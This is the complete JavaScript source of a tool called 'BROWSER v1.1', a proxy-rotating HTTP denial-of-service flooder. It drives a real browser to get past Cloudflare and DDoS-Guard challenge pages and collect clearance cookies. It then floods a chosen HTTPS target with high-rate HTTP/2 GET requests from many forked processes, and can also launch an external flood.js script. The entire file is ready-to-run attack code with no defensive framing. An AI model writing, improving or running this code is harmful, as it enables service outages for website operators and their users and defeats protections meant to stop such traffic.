
import randomUseragent from 'random-useragent';
import { EventEmitter } from 'events';

EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.on('uncaughtException', (er) => {
    // console.error(er);
});

process.on('unhandledRejection', (er) => {
    // console.error(er);
});

process.on("SIGHUP", () => {
    return 1;
});

process.on("SIGCHILD", () => {
    return 1;
});

import { connect } from 'puppeteer-real-browser';
import { connect as http2 } from 'http2';
import { spawn } from 'child_process';
import fs from 'fs';
import colors from 'colors';
import { URL } from 'url';
import cluster from 'cluster';
import timers from 'timers/promises';
import tls from 'tls';
import net from 'net';


import { exec } from 'child_process';

if (process.argv.length < 4) {
    console.clear();

    console.log(`
    ${`${'BROWSER v1.1'.underline} | Optional browser headless mode, Cloudflare turnstile bypass,
    browser fingerprints, multiple flooders, randrate support, browser optimization.`.italic}

    ${'Usage:'.bold.underline}

        ${`xvfb-run node BROWSER.mjs ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'xvfb-run node BROWSER.mjs https://google.com 300 5 90 proxy.txt --debug true'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Enabled basic debugging.`.italic}
        --bypass        ${'true'.green}        ${'-'.red.bold}   ${`IP-cookie bound flood`.italic}
        --flooder       ${'true'.green}        ${'-'.red.bold}   ${`Use built-in HTTP2 flooder.`.italic}
        --headless      ${'true'.green}        ${'-'.red.bold}   ${'Render browser without ui.'.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --optimize      ${'true'.green}        ${'-'.red.bold}   ${'Block stylesheets to increase speed.'.italic}
        --fingerprint   ${'true'.green}        ${'-'.red.bold}   ${'Enable browser fingerprint.'.italic}
    `);
    process.exit(0)
}

const target = process.argv[2]; // || 'https://localhost:443';
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6]; // || 'proxies.txt';

let usedProxies = {}
let flooders = 0;

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

if (!proxyfile) { error("Invalid proxy file!")}
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!") }

const parsed = new URL(target);

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--bypass', value: get_option('--bypass') },
    { flag: '--flooder', value: get_option('--floder') },
    { flag: '--headless', value: get_option('--headless') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--optimize', value: get_option('--optimize') },
    { flag: '--fingerprint', value: get_option('--fingerprint') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    if (enabled('debug')) {
        console.log(`[BROWSER] (${`${hours}:${minutes}:${seconds}`.cyan}) | ${string}`);
    }
}

function random_proxy() {
    let proxy = proxies[~~(Math.random() * (proxies.length))].split(':');
    while (usedProxies[proxy]) {
        if (Object.keys(usedProxies).length == proxies.length) {
            return;
        }
        proxy = proxies[~~(Math.random() * (proxies.length))].split(':');
    }
    return proxy;
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function spawn_flooder(proxy, ua, cookie) {
    let _rate;
    if (enabled('randrate')) {
        _rate = random_int(1, 90);
    } else {
        _rate = rate;
    }

    let bypass;
    if (enabled('bypass')) {
        bypass = [ '--ip', proxy.join(':') ]
    }
    const floodArgs = [
      "flood.js",
      target,
      duration,
      "1",
      proxy.join(':'),
      _rate,
      cookie,
      ua,
      "GET"
      
    ]
    console.log("\n--------------------------\nArguments sent:", floodArgs.join(' '), '\n--------------------------\n');
    const starts = spawn('node', floodArgs);

    starts.on('data', (data) => {  });
    starts.on('exit', (code, signal) => { starts.kill(); });
}

async function flooder(proxy, ua, cookie) {
    if (!enabled('flooder')) {
        spawn_flooder(proxy, ua, cookie);
        return;
    }
    let tls_conn;
    const socket = net.connect(Number(proxy[1]), proxy[0], () => {
        socket.once('data', () => {
            const client = http2(target, {
                protocol: 'https',
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456 * 10,
                    maxHeaderListSize: 262144 * 10,
                    enablePush: false
                },
                createConnection: () => {
                    tls_conn = tls.connect({
                        host: parsed.host,
                        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;',
                        echdCurve: "GREASE:X25519:x25519",
                        host: parsed.host,
                        servername: parsed.host,
                        minVersion: 'TLSv1.1',
                        maxVersion: 'TLSv1.3',
                        secure: true,
                        requestCert: true,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2'],
                        socket: socket,
                    });
                    tls_conn.allowHalfOpen = true;
                    tls_conn.setNoDelay(true);
                    tls_conn.setKeepAlive(true, 60 * 1000);
                    tls_conn.setTimeout(10000);
                    tls_conn.setMaxListeners(0);
                    return tls_conn;
                },
            }, function() {
                function request() {
                    if (client.destroyed) { return }
                    let _rate;
                    if (enabled('randrate')) {
                        _rate = random_int(1, 90);
                    } else {
                        _rate = rate;
                    }
                    for (var i = 0; i < _rate; i++) {
                        const req = client.request({
                            ':path': parsed.path,
                            ':method': 'GET',
                            ':authority': parsed.host,
                            ':scheme': 'https',
                            'upgrade-insecure-requests': '1',
                            'user-agent': ua,
                            'sec-ch-ua': "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "\"macOS\"",
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-site',
                            'sec-fetch-user': '?1',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-encoding': 'gzip, deflate, br, zstd',
                            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                            'priority': 'u=0, i',
                            'referer': parsed.href,
                            'cookie': cookie
                          });
                        
                          if (enabled('debug')) {
                            req.on('response', (headers, flags) => {
                                const status = headers[':status'];
                                let coloredStatus;
                                switch (true) {
                                    case status < 500 && status >= 400 && status !== 404:
                                        coloredStatus = status.toString().red;
                                        break;
                                    case status >= 300 && status < 400:
                                        coloredStatus = status.toString().yellow;
                                        break;
                                    case status === 503:
                                        coloredStatus = status.toString().cyan;
                                        break;
                                    default:
                                        coloredStatus = status.toString().green;
                                    }
                                log(`(${colors.magenta(proxy[0])}) ${parsed.host}, ${coloredStatus}`);
                              });
                          }
                          req.end();
                    }
                    setTimeout(() => {
                        request()
                    }, 1000 / _rate);
                }
                request();
            }).on('error', (err) => {
                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET" || err.code == "ERR_HTTP2_ERROR") {
                    client.close(); //gracefully shut down http2 client to avoid httpddos (socket close)
                }
            })
        }).on('error', () => {
            tls_conn.destroy()
        })
        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('close', () => {
        if (tls_conn) { tls_conn.end(() => { tls_conn.destroy(); attack() }) }
    })
}

async function browser(proxy) {
    let page, _browser;
    try {
        let { page: _page, browser: __browser } = await connect({
            headless: enabled('headless') ? true: 'auto',
            fingerprint: enabled('fingerprint') ? true: false,
            turnstile: true,
            tf: true,
            proxy: {
                host: proxy[0],
                port: proxy[1],
            }
        });

        page = _page;
        _browser = __browser;
        await page.setJavaScriptEnabled(true);
        await page.setDefaultNavigationTimeout(0);
        if (enabled('optimize')) {
            await page.setRequestInterception(true);
            await page.on('request', (req) => {
                if(req.resourceType() == 'stylesheet' || req.resourceType() == 'font' || req.resourceType() == 'image'){
                    req.abort();
                } else {
                    req.continue();
                }
            });
        }
    
        await page.goto(target, {
            waitUntil: "domcontentloaded"
        });
    
        const userAgent = await page.evaluate(() => {
            return navigator.userAgent;
        });
    
    
        log(`(${colors.magenta(proxy[0])}) User-Agent: ${colors.yellow(userAgent)}`);
    
        let titles = [];
    
        async function title() {
            const title_interval = setInterval(async () => {
    
                const title = await page.title();
                if (title.startsWith("Failed to load URL ")) {
                    await _browser.close();
                    if (flooders >= threads) {
                        return;
                    }
                    browser(random_proxy());
                    clearInterval(title_interval);
                }
    
                if (!title) {
                    return;
                }
    
                if (title !== titles[titles.length -1]) {
                    log(`(${colors.magenta(proxy[0])}) Title: ${colors.italic(title)}`);
                }
    
                try {
                    titles.push(title);
                } catch {
                    console.log("failed to push title? what XD")
                }
    
                if (!title.includes('Just a moment...') && title !== undefined) {
                    clearInterval(title_interval);
                    return;
                }
            }, 1000).unref()
        }
    
        await title();
    
        let protections = [
            'just a moment...',
            'ddos-guard',
            
        ]
    
        await new Promise(async (resolve) => {
            while (titles.length == 0 || protections.filter(a => titles[titles.length - 1].toLowerCase().indexOf(a) != -1).length > 0) {
                await timers.setTimeout(100, null, { ref: false })
            }
            resolve(null)
        })
    
        var cookies = await page.cookies();
        if (cookies.length > 0) {
            const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    
            log(`(${colors.magenta(proxy[0])}) Cookies: ${colors.green(_cookie)}`);
            log(`(${colors.magenta(proxy[0])}) ${colors.cyan.underline('Launching flooder')}`)
        
            flooder(proxy, userAgent, _cookie);
            flooders++
        }
    } catch (e) {
        if (enabled('debug')) {
            log(`(${colors.magenta(proxy[0])}) Error: ${colors.red(e.message)}`);
        }
    } finally {
        if (_browser && page) {
            await page.close();
            await _browser.close();
        }
        if (flooders >= threads) {
            return;
        }
        browser(random_proxy());
    }
}

function start() {
    browser(random_proxy());
}

if (cluster.isMaster) {
    let _options = ""
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`
            ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`BROWSER (v1.1)`.italic} ${']'.red} 
            ${'TARGET'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
            ${'TIME'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'THREADS'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'RATE'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
            ${'OPTIONS'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    for (let i = 0; i < threads; i++){
        cluster.fork();
    }
    setTimeout(() => process.exit(log('Master process exiting')), duration * 1000);
} else {
    start();
    setTimeout(() => process.exit(log(`Subprocess ${process.pid} exiting`)), duration * 1000);
}